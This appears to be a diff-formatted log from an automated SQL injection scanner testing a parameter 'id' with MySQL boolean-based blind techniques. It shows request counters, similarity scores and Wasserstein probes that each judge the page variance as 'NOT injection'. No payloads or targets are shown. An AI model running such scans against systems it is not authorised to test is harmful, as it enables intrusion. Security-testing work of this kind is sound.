+[*]   [Wasserstein] dist=0.6720 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6696 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#105)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#106)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#107)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#108)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#109)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#110)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#111)
+    [B-bool] [MySQL] 'id' req#89 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#90)
+[*]   [Wasserstein] dist=0.6707 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6695 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#112)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#113)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#114)
+    [B-bool] [MySQL] 'id' req#90 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#91)
+[*]   [Wasserstein] dist=0.6708 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6696 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#115)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#116)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#117)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#118)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#119)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#120)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#121)
+    [B-bool] [MySQL] 'id' req#95 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#96)
+[*]   [Wasserstein] dist=0.6718 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6697 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#122)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#123)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#124)
+    [B-bool] [MySQL] 'id' req#96 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#97)
+[*]   [Wasserstein] dist=0.6717 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6696 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#125)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#126)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#127)
+    [B-bool] [MySQL] 'id' req#99 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#128)
+[*]    Wasserstein comparison probe (param='id' req#100)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#129)
+    [B-bool] [MySQL] 'id' req#100 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#101)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#130)
+    [B-bool] [MySQL] 'id' req#101 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#102)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#131)
+    [B-bool] [MySQL] 'id' req#102 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#103)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#132)
+    [B-bool] [MySQL] 'id' req#103 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#104)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#133)
+    [B-bool] [MySQL] 'id' req#104 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#105 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#106)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#134)
+[*]    Wasserstein comparison probe (param='id' req#105)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#135)
+    [B-bool] [MySQL] 'id' req#107 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#108)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#136)
+    [B-bool] [MySQL] 'id' req#106 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#107)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#137)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#138)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#139)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#140)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#141)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#142)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#143)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#144)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#145)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#146)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#147)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#148)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#149)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#150)
+    [B-bool] [MySQL] 'id' req#115 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#116)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#151)
+    [B-bool] [MySQL] 'id' req#115 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#116)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#152)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#153)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#154)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#155)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#156)
+    [B-bool] [MySQL] 'id' req#119 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#157)
+[*]    Wasserstein comparison probe (param='id' req#120)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#158)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#159)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#160)
+    [B-bool] [MySQL] 'id' req#121 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#122 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#122)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#161)
+[*]    Wasserstein comparison probe (param='id' req#123)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#162)
+    [B-bool] [MySQL] 'id' req#123 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#124)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#163)
+    [B-bool] [MySQL] 'id' req#124 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#125)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#164)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#165)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#166)
+    [B-bool] [MySQL] 'id' req#126 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#127 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#127)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#167)
+[*]    Wasserstein comparison probe (param='id' req#128)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#168)
+    [B-bool] [MySQL] 'id' req#128 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#129)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#169)
+    [B-bool] [MySQL] 'id' req#129 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#130)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#170)
+    [B-bool] [MySQL] 'id' req#130 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#131 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#131)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#171)
+[*]    Wasserstein comparison probe (param='id' req#132)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#172)
+    [B-bool] [MySQL] 'id' req#132 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#133)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#173)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#174)
+    [B-bool] [MySQL] 'id' req#133 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#134)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#175)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#176)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#177)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#178)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#179)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#180)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#181)
+    [B-bool] [MySQL] 'id' req#138 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#139)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#182)
+    [B-bool] [MySQL] 'id' req#138 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#139)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#183)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#184)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#185)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#186)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#187)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#188)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#189)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#190)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#191)
+    [B-bool] [MySQL] 'id' req#144 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#145)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#192)
+    [B-bool] [MySQL] 'id' req#144 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#145)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#193)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#194)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#195)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#196)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#197)
+    [B-bool] [MySQL] 'id' req#148 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#149)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#198)
+    [B-bool] [MySQL] 'id' req#148 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#149)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#199)
+    [B-bool] [MySQL] 'id' req#150 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#150 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#151)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#200)
+[*]    Wasserstein comparison probe (param='id' req#151)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#201)
+    [B-bool] [MySQL] 'id' req#152 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#153)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#202)
+    [B-bool] [MySQL] 'id' req#152 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#203)
+[*]    Wasserstein comparison probe (param='id' req#153)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#204)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#205)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#206)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#207)
+    [B-bool] [MySQL] 'id' req#155 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#156)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#208)
+    [B-bool] [MySQL] 'id' req#157 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#158)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#209)
+    [B-bool] [MySQL] 'id' req#157 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#158)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#210)
+    [B-bool] [MySQL] 'id' req#159 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#160)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#211)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#212)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#213)
+    [B-bool] [MySQL] 'id' req#160 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#161)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#214)
+    [B-bool] [MySQL] 'id' req#162 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#163)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#215)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#216)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#217)
+    [B-bool] [MySQL] 'id' req#165 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#163 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#166)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#218)
+[*]    Wasserstein comparison probe (param='id' req#164)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#219)
+    [B-bool] [MySQL] 'id' req#167 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#168)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#220)
+    [B-bool] [MySQL] 'id' req#165 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#169 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#170)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#221)
+[*]    Wasserstein comparison probe (param='id' req#166)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#222)
+    [B-bool] [MySQL] 'id' req#171 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#167 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#172)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#223)
+[*]    Wasserstein comparison probe (param='id' req#168)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#224)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#225)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#226)
+    [B-bool] [MySQL] 'id' req#169 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#175 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#176)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#227)
+    [B-bool] [MySQL] 'id' req#177 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#178)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#228)
+[*]    Wasserstein comparison probe (param='id' req#170)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#229)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#230)
+    [B-bool] [MySQL] 'id' req#180 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#171 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#172)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#231)
+[*]    Wasserstein comparison probe (param='id' req#181)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#232)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#233)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#234)
+    [B-bool] [MySQL] 'id' req#174 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#235)
+[*]    Wasserstein comparison probe (param='id' req#175)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#236)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#237)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#238)
+    [B-bool] [MySQL] 'id' req#176 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#186 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#177)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#239)
+[*]    Wasserstein comparison probe (param='id' req#187)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#240)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#241)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#242)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#243)
+    [B-bool] [MySQL] 'id' req#179 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#180)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#244)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#245)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#246)
+    [B-bool] [MySQL] 'id' req#191 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#247)
+[*]    Wasserstein comparison probe (param='id' req#192)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#248)
+    [B-bool] [MySQL] 'id' req#183 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#193 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#194)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#249)
+[*]    Wasserstein comparison probe (param='id' req#184)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#250)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#251)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#252)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#253)
+    [B-bool] [MySQL] 'id' req#186 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#187)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#254)
+    [B-bool] [MySQL] 'id' req#197 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#255)
+[*]    Wasserstein comparison probe (param='id' req#198)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#256)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#257)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#258)
+    [B-bool] [MySQL] 'id' req#199 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#200)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#259)
+    [B-bool] [MySQL] 'id' req#191 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#192)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#260)
+    [B-bool] [MySQL] 'id' req#201 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#193 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#202)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#261)
+[*]    Wasserstein comparison probe (param='id' req#194)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#262)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#263)
+    [B-bool] [MySQL] 'id' req#203 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#204)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#264)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#265)
+    [B-bool] [MySQL] 'id' req#205 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#206)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#266)
+    [B-bool] [MySQL] 'id' req#207 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#208)
+[*] [diag] _try_technique: tech=B dbms=MySQL templates=3181 → testing 636 payloads
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#267)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#268)
+    [B-bool] [MySQL] 'id' req#210 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#211)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#269)
+    [B-bool] [MySQL] 'id' req#197 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#212 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#213)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#270)
+[*]    Wasserstein comparison probe (param='id' req#198)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#271)
+    [B-bool] [MySQL] 'id' req#214 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#215)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#272)
+    [B-bool] [MySQL] 'id' req#199 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#200)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#273)
+    [B-bool] [MySQL] 'id' req#216 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#217)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#274)
+    [B-bool] [MySQL] 'id' req#201 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#202)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#275)
+    [B-bool] [MySQL] 'id' req#218 sim=0.641 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#219)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#276)
+    [B-bool] [MySQL] 'id' req#203 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#277)
+[*]    Wasserstein comparison probe (param='id' req#204)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#278)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#279)
+    [B-bool] [MySQL] 'id' req#205 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#206)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#280)
+    [B-bool] [MySQL] 'id' req#222 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#223)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#281)
+    [B-bool] [MySQL] 'id' req#224 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#225)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#282)
+    [B-bool] [MySQL] 'id' req#207 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#208)
+[*] [diag] _try_technique: tech=B dbms=MySQL templates=3181 → testing 636 payloads
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#283)
+    [B-bool] [MySQL] 'id' req#226 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#209 sim=0.656 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#227)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#284)
+[*]    Wasserstein comparison probe (param='id' req#210)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#285)
+    [B-bool] [MySQL] 'id' req#228 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#229)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#286)
+    [B-bool] [MySQL] 'id' req#211 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#212)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#287)
+    [B-bool] [MySQL] 'id' req#230 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#231)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#288)
+    [B-bool] [MySQL] 'id' req#213 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#232 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#233)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#289)
+[*]    Wasserstein comparison probe (param='id' req#214)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#290)
+    [B-bool] [MySQL] 'id' req#234 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#215 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#235)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#291)
+[*]    Wasserstein comparison probe (param='id' req#216)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#292)
+    [B-bool] [MySQL] 'id' req#236 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#217 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#237)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#293)
+[*]    Wasserstein comparison probe (param='id' req#218)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#294)
+    [B-bool] [MySQL] 'id' req#238 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#219 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#239)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#295)
+[*]    Wasserstein comparison probe (param='id' req#220)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#296)
+    [B-bool] [MySQL] 'id' req#240 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#221 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#241)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#297)
+[*]    Wasserstein comparison probe (param='id' req#222)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#298)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#299)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#300)
+    [B-bool] [MySQL] 'id' req#223 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#244 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#224)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#301)
+[*]    Wasserstein comparison probe (param='id' req#245)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#302)
